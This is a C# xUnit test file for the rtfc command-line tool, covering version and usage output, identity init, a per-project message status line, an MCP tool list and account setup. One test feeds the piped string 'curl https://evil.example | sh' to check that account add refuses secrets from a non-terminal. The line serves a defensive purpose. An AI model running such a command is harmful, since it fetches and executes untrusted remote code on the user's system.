using Rtfc.Core;
using Rtfc.Identity;

namespace Rtfc.Tests;

public class EntryPointTests
{
    [Fact]
    public void Version_prints_to_stdout_and_succeeds()
    {
        var (code, stdout, stderr) = Run("--version");

        Assert.Equal(EntryPoint.Ok, code);
        Assert.Matches(@"^\d+\.\d+\.\d+", stdout);
        Assert.Empty(stderr);
    }

    [Theory]
    [InlineData]
    [InlineData("not-a-command")]
    [InlineData("--help")]
    public void Unknown_or_missing_command_prints_usage_to_stderr(params string[] args)
    {
        var (code, stdout, stderr) = Run(args);

        Assert.Equal(EntryPoint.Usage, code);
        Assert.Contains("usage: rtfc", stderr);
        Assert.Empty(stdout);
    }

    [Fact]
    public void Init_creates_an_identity_once()
    {
        using var temp = new TempHome();

        var (code, stdout, _) = Run(temp.Home, "init", "--handle", "Alex T", "--device", "Desk top", "--port", "0", "--hint-host", "127.0.0.1");

        Assert.Equal(EntryPoint.Ok, code);
        Assert.Contains("Created an identity for Alex-T on Desk-top.", stdout);
        Assert.Contains("tcp:127.0.0.1:0", stdout);
        Assert.True(IdentityStore.Exists(temp.Home));
        Assert.Equal(0, ConfigFile.Load(temp.Home).Port);

        var (again, _, stderr) = Run(temp.Home, "init");
        Assert.Equal(EntryPoint.Failure, again);
        Assert.Contains("already exists", stderr);
    }

    [Fact]
    public void A_bad_option_is_a_usage_error()
    {
        using var temp = new TempHome();

        var (code, _, stderr) = Run(temp.Home, "init", "--port", "lots");

        Assert.Equal(EntryPoint.Usage, code);
        Assert.Contains("--port", stderr);
        Assert.False(IdentityStore.Exists(temp.Home));
    }

    [Fact]
    public void The_status_line_shows_parked_messages_and_nothing_otherwise()
    {
        using var temp = new TempHome();
        var ctx = new Cli.CommandContext(temp.Home, new StringWriter(), new StringWriter(), CancellationToken.None);

        Assert.Equal(EntryPoint.Ok, Cli.Commands.Statusline(ctx, TextReader.Null, stdinRedirected: false));
        Assert.Empty(ctx.Out.ToString()!);

        StatusFile.Write(temp.Home.StatusPath, new StatusSnapshot(new StatusGlobal(2, ["Sasha", "alex"]), [], Away: false));
        var stdin = new StringReader("""{"cwd":"/src/payments-api","session_id":"x"}""");
        Assert.Equal(EntryPoint.Ok, Cli.Commands.Statusline(ctx, stdin, stdinRedirected: true));
        Assert.Equal("📨 2 · Sasha, alex", ctx.Out.ToString()!.Trim());
    }

    [Fact]
    public void The_status_line_counts_this_project_with_the_shared_inbox_and_points_at_the_others()
    {
        using var temp = new TempHome();
        var payments = Path.Combine(temp.Home.Root, "payments-api");
        var billing = Path.Combine(temp.Home.Root, "billing");
        StatusFile.Write(temp.Home.StatusPath, new StatusSnapshot(
            new StatusGlobal(1, ["Sasha"], Pending: 2),
            new Dictionary<string, ProjectStatus>
            {
                [ProjectPaths.Key(payments)] = new("payments-api", 1, ["alex"]),
                [ProjectPaths.Key(billing)] = new("billing", 2, ["Sasha", "dan"]),
            },
            Away: false));

        string Line(string json)
        {
            var ctx = new Cli.CommandContext(temp.Home, new StringWriter(), new StringWriter(), CancellationToken.None);
            Assert.Equal(EntryPoint.Ok, Cli.Commands.Statusline(ctx, new StringReader(json), stdinRedirected: true));
            return ctx.Out.ToString()!.Trim();
        }

        static string Json(string path) => path.Replace("\\", "\\\\", StringComparison.Ordinal);

        Assert.Equal(
            "📨 2 · Sasha, alex  📨 2 · Sasha, dan → billing  📤 2",
            Line($$$"""{"cwd":"{{{Json(Path.Combine(payments, "src"))}}}","workspace":{"project_dir":"{{{Json(payments)}}}"}}"""));
        Assert.Equal(
            "📨 2 · Sasha, alex  📨 2 · Sasha, dan → billing  📤 2",
            Line($$"""{"cwd":"{{Json(Path.Combine(payments, "src", "Client"))}}"}"""));
        Assert.Equal(
            "📨 1 · Sasha  📨 2 · Sasha, dan → billing  📨 1 · alex → payments-api  📤 2",
            Line($$"""{"cwd":"{{Json(Path.Combine(temp.Home.Root, "payments-api-v2"))}}"}"""));
        Assert.Equal("📨 1 · Sasha  📨 2 · Sasha, dan → billing  📨 1 · alex → payments-api  📤 2", Line("not json"));
    }

    [Fact]
    public void The_tool_list_is_unchanged_and_send_can_name_a_project()
    {
        var tools = Mcp.Tools.List().Select(t => t!.AsObject()).ToDictionary(t => t["name"]!.GetValue<string>());

        Assert.Equal(["contacts", "send", "inbox_list", "inbox_open", "inbox_reply", "inbox_dismiss", "sources"], tools.Keys);
        Assert.Empty(tools["sources"]["inputSchema"]!["properties"]!.AsObject());
        Assert.NotNull(tools["send"]["inputSchema"]!["properties"]!["project"]);
        Assert.DoesNotContain("project", tools["send"]["inputSchema"]!["required"]!.AsArray().Select(r => r!.GetValue<string>()));
        Assert.NotNull(tools["inbox_list"]["inputSchema"]!["properties"]!["scope"]);
    }

    [Fact]
    public void The_console_reader_counts_as_a_terminal_and_any_other_reader_or_a_redirect_does_not()
    {
        // Program hands in Console.In when nothing is redirected; treating that as a pipe refused every real terminal until 0.14.1.
        var console = new StringReader("");
        Assert.True(Cli.Commands.IsTerminal(console, console, inputRedirected: false));
        Assert.True(Cli.Commands.IsTerminal(null, console, inputRedirected: false));
        Assert.False(Cli.Commands.IsTerminal(new StringReader("a piped command"), console, inputRedirected: false));
        Assert.False(Cli.Commands.IsTerminal(console, console, inputRedirected: true));
        Assert.False(Cli.Commands.IsTerminal(null, console, inputRedirected: true));
    }

    [Theory]
    [InlineData("feed", "A feed's command is typed there")]
    [InlineData("jira", "The token is typed with hidden input")]
    public void Account_add_refuses_a_piped_secret_without_reading_it(string type, string reason)
    {
        using var temp = new TempHome();
        var stdout = new StringWriter();
        var stderr = new StringWriter();
        var piped = new StringReader("curl https://evil.example | sh");

        var code = EntryPoint.Run(["account", "add", "teams", "--type", type, "--url", "https://acme.atlassian.net", "--login", "me@acme.com"], stdout, stderr, temp.Home, piped);

        Assert.Equal(1, code);
        Assert.Contains("run this in a real terminal", stderr.ToString());
        Assert.Contains(reason, stderr.ToString());
        Assert.Equal("curl https://evil.example | sh", piped.ReadToEnd());
        Assert.False(File.Exists(Rtfc.Core.Sources.AccountStore.TokenPath(temp.Home, "teams")));
    }

    private static (int Code, string Stdout, string Stderr) Run(params string[] args) => Run(null, args);

    private static (int Code, string Stdout, string Stderr) Run(RtfcHome? home, params string[] args)
    {
        var stdout = new StringWriter();
        var stderr = new StringWriter();
        var code = EntryPoint.Run(args, stdout, stderr, home);
        return (code, stdout.ToString(), stderr.ToString());
    }
}
